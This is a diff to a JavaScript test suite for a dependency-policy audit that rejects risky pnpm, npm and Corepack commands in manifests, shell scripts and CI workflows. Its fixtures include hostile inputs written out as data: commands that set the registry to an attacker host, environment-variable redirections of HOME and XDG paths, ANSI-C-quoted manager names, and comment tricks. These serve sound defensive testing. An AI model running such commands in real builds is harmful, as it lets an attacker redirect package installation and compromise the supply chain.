@@ -112,16 +112,20 @@ packages:
     resolution: {integrity: sha512-YWJjZA==}
   '@pnpm/exe@11.28.9':
     resolution: {integrity: sha512-YWJjZA==}
+  '@pnpm/linux-x64@11.28.9':
+    resolution: {integrity: sha512-YWJjZA==}
   corepack@0.34.6:
     resolution: {integrity: sha512-YWJjZA==}
   pnpm-workspace-tool@1.0.0:
     resolution: {integrity: sha512-YWJjZA==}
 `
   assert.deepEqual(auditLockfile(lockfile), {
-    errors: ['pnpm@11.28.9', '@pnpm/exe@11.28.9', 'corepack@0.34.6'].map(
+    // pnpm ships its platform binary as `@pnpm/<platform>`, so the whole
+    // `@pnpm` scope is a package manager that must come from Corepack.
+    errors: ['pnpm@11.28.9', '@pnpm/exe@11.28.9', '@pnpm/linux-x64@11.28.9', 'corepack@0.34.6'].map(
       key => `${key} is a package manager; pnpm must come from Corepack's packageManager pin`
     ),
-    packageCount: 5,
+    packageCount: 6,
   })
 })
 
@@ -3535,6 +3539,9 @@ test('executable dependency command audit rejects manager lines it cannot read i
 
   // ANSI-C quoting spells any character as an escape, so the audit cannot read
   // the word it makes.
+  // ANSI-C quoting is rejected where it hides a manager, an option or a
+  // variable: on a manager line, and (decoded) where it spells a guarded
+  // variable. Both forms below do both.
   const ansi = text =>
     `ANSI-C quoting is rejected because it hides the text the shell runs: ${text}`
   assertRejectedWith([
@@ -3546,8 +3553,32 @@ test('executable dependency command audit rejects manager lines it cannot read i
       "$'COREPACK\\x5fENABLE_PROJECT_SPEC=0' corepack pnpm install --frozen-lockfile",
       ansi("$'COREPACK\\x5fENABLE_PROJECT_SPEC=0'"),
     ],
-    ["X=$'a' make build", ansi("$'a'")],
   ])
+  // A guarded variable set through ANSI-C with no manager on the line is still
+  // caught, by its decoded spelling, and a manager or option spelled through
+  // ANSI-C is read from the decoding where the original hid it.
+  assertRejectedWith([
+    [
+      "export $'pnpm\\x5fconfig_registry=https://attacker.example/'",
+      'pnpm_config_ variable overrides a reviewed pnpm setting: pnpm_config_registry',
+    ],
+    [
+      "$'pnpm' install --dangerously-allow-all-builds",
+      'pnpm option is not on the reviewed allowlist: --dangerously-allow-all-builds',
+    ],
+    ["$'npx' evil@latest", 'executable package is not pinned to an exact version: evil@latest'],
+  ])
+  // ANSI-C as a plain value on a line that runs no package manager hides
+  // nothing the audit must read.
+  assert.deepEqual(
+    auditExecutableDependencyCommands([
+      {
+        file: 'package.json',
+        commands: ["X=$'a' make build", "IFS=$'\\n' read -r a b", "printf $'%s\\n' done"],
+      },
+    ]),
+    { commandCount: 3, errors: [] }
+  )
 
   // A word pnpm hands to a script or binary unparsed may be computed, as the
   // repository's own commands pass the artifact version that way.
@@ -3634,13 +3665,41 @@ test('executable dependency command audit rejects variables that move pnpm confi
       'export HOME=/tmp/attacker\ncorepack pnpm install --frozen-lockfile\n',
       'HOME',
     ],
-    ['scripts/build.sh', 'xdg_config_home=./cfg\nexport xdg_config_home\n', 'xdg_config_home'],
+    ['scripts/build.sh', 'export XDG_CONFIG_HOME=./cfg\n', 'XDG_CONFIG_HOME'],
+    // pnpm still reads npm_config_workspace_dir to find the workspace root, so
+    // exporting it before a delegated script redirects which config it reads.
+    [
+      'scripts/build.sh',
+      'export npm_config_workspace_dir=./attacker\nbash scripts/next.sh\n',
+      'npm_config_workspace_dir',
+    ],
+    // XDG_CACHE_HOME moves Corepack's install cache, which it reuses without a
+    // hash check, and XDG_DATA_HOME moves pnpm's store.
+    [
+      'package.json',
+      'XDG_CACHE_HOME=./cache corepack pnpm install --frozen-lockfile',
+      'XDG_CACHE_HOME',
+    ],
+    [
+      'package.json',
+      'XDG_DATA_HOME=./data corepack pnpm install --frozen-lockfile',
+      'XDG_DATA_HOME',
+    ],
+    ['.github/workflows/cache.yml', workflow('XDG_CACHE_HOME: ./cache'), 'XDG_CACHE_HOME'],
     [
       'scripts/build.sh',
       'read -r HOME < ./home.txt\ncorepack pnpm install --frozen-lockfile\n',
       'HOME',
     ],
     ['scripts/build.sh', ': "${XDG_CONFIG_HOME:=./cfg}"\n', 'XDG_CONFIG_HOME'],
+    // A GitHub Actions multiline write, a `for` loop, and a declared nameref.
+    [
+      'scripts/build.sh',
+      '{ echo "XDG_CONFIG_HOME<<EOF"; echo /tmp/evil; echo EOF; } >> "$GITHUB_ENV"\n',
+      'XDG_CONFIG_HOME',
+    ],
+    ['scripts/build.sh', 'for HOME in /tmp/a /tmp/b; do :; done\n', 'HOME'],
+    ['scripts/build.sh', 'declare -n ref=HOME\nref=/tmp/evil\n', 'HOME'],
     ['.github/workflows/xdg.yml', workflow('XDG_CONFIG_HOME: ./cfg'), 'XDG_CONFIG_HOME'],
     ['.github/workflows/home.yml', workflow('HOME: ./home'), 'HOME'],
     [
@@ -3648,23 +3707,33 @@ test('executable dependency command audit rejects variables that move pnpm confi
       'jobs:\n  build:\n    steps:\n      - run: echo "HOME=./home" >> "$GITHUB_ENV"\n',
       'HOME',
     ],
+    [
+      '.github/workflows/github-env.yml',
+      'jobs:\n  build:\n    steps:\n      - run: |\n          { echo "XDG_CONFIG_HOME<<EOF"; echo /tmp/evil; echo EOF; } >> "$GITHUB_ENV"\n',
+      'XDG_CONFIG_HOME',
+    ],
   ]
   for (const [file, command, name] of cases) {
     assertRejectedWith([[command, moved(name)]], file)
   }
 
-  // Reading them is not setting them.
+  // These are real environment-variable names, matched case-sensitively, so a
+  // lowercase variable of the same spelling is a different, harmless one; and
+  // reading one is not setting it.
   assert.deepEqual(
     auditExecutableDependencyCommands([
       {
         file: 'package.json',
         commands: [
+          'home=$(pwd) node scripts/check.mjs',
+          'xdg_config_home=./cfg make build',
           'node scripts/check.mjs --home "$HOME" --config "${XDG_CONFIG_HOME:-$HOME/.config}"',
           'test -d "$PNPM_HOME" || mkdir -p "$HOME/.cache"',
+          'echo "pnpm version: $(corepack pnpm --version)"',
         ],
       },
     ]),
-    { commandCount: 2, errors: [] }
+    { commandCount: 5, errors: [] }
   )
 })
 
@@ -3746,6 +3815,8 @@ test('delegated script audit rejects environment it cannot read in JavaScript', 
           helper: 'node scripts/helper.mjs',
           mutated: 'node scripts/mutated.mjs',
           nested: 'node scripts/nested.mjs',
+          holder: 'node scripts/holder.mjs',
+          aliased: 'node scripts/aliased.mjs',
           home: 'node scripts/home.mjs',
           ok: 'node scripts/ok.mjs',
         },
@@ -3796,6 +3867,25 @@ test('delegated script audit rejects environment it cannot read in JavaScript', 
       "execFileSync('node', ['scripts/ok.mjs'], { env: buildEnvironment() })",
       '',
     ].join('\n'),
+    // An env object stored inside another object and then written through that
+    // holder, with a concatenated key, reaches the child unread.
+    'scripts/holder.mjs': [
+      "import { execFileSync } from 'node:child_process'",
+      'const env = { PATH: process.env.PATH }',
+      'const holder = { e: env }',
+      "holder.e['npm_config_' + 'userconfig'] = './auth.ini'",
+      "execFileSync('corepack', ['pnpm', 'install', '--frozen-lockfile'], { env })",
+      '',
+    ].join('\n'),
+    // An env object that escapes into a call, a new-expression or a conditional
+    // can be mutated out of sight, so it is unreadable at the child call.
+    'scripts/aliased.mjs': [
+      "import { execFileSync } from 'node:child_process'",
+      'const env = { PATH: process.env.PATH }',
+      'new Mutator(env)',
+      "execFileSync('corepack', ['pnpm', 'install', '--frozen-lockfile'], { env })",
+      '',
+    ].join('\n'),
     'scripts/home.mjs': [
       "import { execFileSync } from 'node:child_process'",
       "process.env.HOME = '/tmp/attacker'",
@@ -3828,11 +3918,13 @@ test('delegated script audit rejects environment it cannot read in JavaScript', 
   const write = text =>
     `delegated JavaScript writes process.env through a key the audit cannot read: ${text}`
   assert.deepEqual(audit.discoveryErrors.sort(), [
+    `scripts/aliased.mjs: ${unreadable('env')}`,
     `scripts/assign.mjs: ${variable('pnpm_config_registry')}`,
     `scripts/computed.mjs: ${unreadable('[key]')}`,
     `scripts/computed.mjs: ${write('process.env[key]')}`,
     `scripts/held.mjs: ${moved('npm_config_userconfig')}`,
     `scripts/helper.mjs: ${unreadable('buildEnvironment()')}`,
+    `scripts/holder.mjs: ${unreadable('env')}`,
     `scripts/home.mjs: ${unreadable('options')}`,
     `scripts/home.mjs: ${moved('HOME')}`,
     `scripts/mutated.mjs: ${unreadable('options')}`,
@@ -3906,7 +3998,40 @@ test('executable dependency command audit does not read comments, paths, or opti
       "cat <<EOF\n'\nEOF\necho '\n# x'; corepack pnpm install --dangerously-allow-all-builds",
       'pnpm option is not on the reviewed allowlist: --dangerously-allow-all-builds',
     ],
+    // bash begins a comment only after a space, tab, newline or a command
+    // operator, not after the `)` that closes a substitution, a vertical tab or
+    // an NBSP, so a `#` glued to any of those hides nothing.
+    [
+      'echo $(true)#; corepack pnpm config set registry https://attacker.example/',
+      'pnpm command that changes settings is rejected: pnpm config',
+    ],
+    [
+      'echo done\u000b# corepack pnpm config set registry https://attacker.example/',
+      'pnpm command that changes settings is rejected: pnpm config',
+    ],
+    [
+      'echo done # corepack pnpm config set registry https://attacker.example/',
+      'pnpm command that changes settings is rejected: pnpm config',
+    ],
   ])
+  assertRejectedWith(
+    [
+      [
+        'jobs:\n  build:\n    steps:\n      - run: |\n          echo $(true)#; corepack pnpm config set registry https://attacker.example/\n',
+        'pnpm command that changes settings is rejected: pnpm config',
+      ],
+    ],
+    '.github/workflows/comment.yml'
+  )
+  assertRejectedWith(
+    [
+      [
+        '#!/usr/bin/env bash\necho $(true)#; corepack pnpm config set registry https://attacker.example/\n',
+        'pnpm command that changes settings is rejected: pnpm config',
+      ],
+    ],
+    'scripts/evil.sh'
+  )
 
   const audit = auditDelegatedFixture('dependency-policy-delegated-node-options-', {
     'package.json': `${JSON.stringify({ scripts: { build: 'node scripts/build.mjs' } }, null, 2)}\n`,
@@ -3923,6 +4048,133 @@ test('executable dependency command audit does not read comments, paths, or opti
     'scripts/build.mjs: package manager command line word is not a plain literal: #',
     'scripts/build.mjs: pnpm option is not on the reviewed allowlist: --dangerously-allow-all-builds',
   ])
+})
+
+// A manager named behind any path prefix is one invocation of it, so its
+// basename is read as the manager and its options and settings commands are
+// audited; the textual reader's character class misses a `/pnpm` whose prefix
+// holds an `@`, `%`, `=` or space, so the line reader is authoritative.
+test('executable dependency command audit reads a path-qualified package manager', () => {
+  const option = text => `pnpm option is not on the reviewed allowlist: ${text}`
+  const settings = name => `pnpm command that changes settings is rejected: pnpm ${name}`
+  assertRejectedWith([
+    [
+      'node_modules/@pnpm/linux-x64/pnpm install --dangerously-allow-all-builds',
+      option('--dangerously-allow-all-builds'),
+    ],
+    [
+      './node_modules/@pnpm/exe/pnpm config set registry https://attacker.example/',
+      settings('config'),
+    ],
+    ['./bin@/pnpm config set registry https://attacker.example/', settings('config')],
+    ["'my tools'/pnpm config set registry https://attacker.example/", settings('config')],
+    ['./v%/pnpm install --no-frozen-lockfile', option('--no-frozen-lockfile')],
+    ["'$HOME'/pnpm config set registry https://attacker.example/", settings('config')],
+  ])
+  // A manager name is the whole basename of a word, not a fragment of a longer
+  // one, so a quoted sentence or a different program is not a manager line.
+  assert.deepEqual(
+    auditExecutableDependencyCommands([
+      {
+        file: 'package.json',
+        commands: [
+          'echo "pnpm version: $(corepack pnpm --version)"',
+          'node_modules/.bin/pnpm-lint run',
+          'echo pnpmfile.cjs',
+        ],
+      },
+    ]),
+    { commandCount: 3, errors: [] }
+  )
+})
+
+// pnpm and npm append the words passed to `run <script>` to the end of the
+// script's command string, so if the script ends in a package manager those
+// words become that command's options. The target is resolved from the
+// manifests and passing any word is rejected; a script that ends in a node
+// program takes computed words as it does today.
+test('executable dependency command audit rejects words passed to a script that runs a package manager', () => {
+  const scriptCommands = name =>
+    ({
+      'version-packages': ['changeset version && pnpm install --lockfile-only'],
+      clean: ['pnpm -r clean'],
+      'package:test': ['node scripts/package-test.js'],
+    })[name] ?? []
+  const reach = name =>
+    `words passed to the \`${name}\` script reach a package manager it runs; pass none`
+  const rejected = [
+    [
+      'corepack pnpm run version-packages --registry=https://attacker.example/',
+      reach('version-packages'),
+    ],
+    [
+      'corepack pnpm run version-packages -- --dangerously-allow-all-builds',
+      reach('version-packages'),
+    ],
+    ['corepack pnpm run version-packages -- "$EXTRA"', reach('version-packages')],
+    [
+      'corepack pnpm version-packages --registry=https://attacker.example/',
+      reach('version-packages'),
+    ],
+    ['npm run version-packages -- --registry=https://attacker.example/', reach('version-packages')],
+    ['corepack pnpm run clean -- --dangerously-allow-all-builds', reach('clean')],
+  ]
+  for (const [command, expected] of rejected) {
+    const { errors } = auditExecutableDependencyCommands(
+      [{ file: 'package.json', commands: [command] }],
+      { scriptCommands }
+    )
+    assert.ok(
+      errors.includes(`package.json: ${expected}`),
+      `${command} must be rejected with "${expected}", got ${JSON.stringify(errors)}`
+    )
+  }
+
+  // Running the script with no passed words is fine, and words passed to a
+  // script that ends in a node program are the script's own.
+  assert.deepEqual(
+    auditExecutableDependencyCommands(
+      [
+        {
+          file: 'package.json',
+          commands: [
+            'corepack pnpm run version-packages',
+            'corepack pnpm --filter qbit-extension run package:test -- --artifact-version "$VERSION"',
+          ],
+        },
+      ],
+      { scriptCommands }
+    ),
+    { commandCount: 2, errors: [] }
+  )
+
+  // The resolver `repositoryCommands` builds from the manifests resolves a
+  // script name to the body those passed words reach.
+  const repoRoot = mkdtempSync(join(tmpdir(), 'dependency-policy-passthrough-'))
+  try {
+    writeFileSync(
+      join(repoRoot, 'package.json'),
+      `${JSON.stringify(
+        {
+          scripts: {
+            'version-packages': 'changeset version && pnpm install --lockfile-only',
+            ci: 'corepack pnpm run version-packages --registry=https://attacker.example/',
+          },
+        },
+        null,
+        2
+      )}\n`
+    )
+    execFileSync('git', ['init', '-q'], { cwd: repoRoot })
+    execFileSync('git', ['add', '-A'], { cwd: repoRoot })
+    const { commandFiles, scriptCommands: resolved } = repositoryCommands(repoRoot)
+    assert.deepEqual(
+      auditExecutableDependencyCommands(commandFiles, { scriptCommands: resolved }).errors,
+      [`package.json: ${reach('version-packages')}`]
+    )
+  } finally {
+    rmSync(repoRoot, { recursive: true, force: true })
+  }
 })
 
 test('executable dependency command audit covers pinned pnpm create normalization', () => {
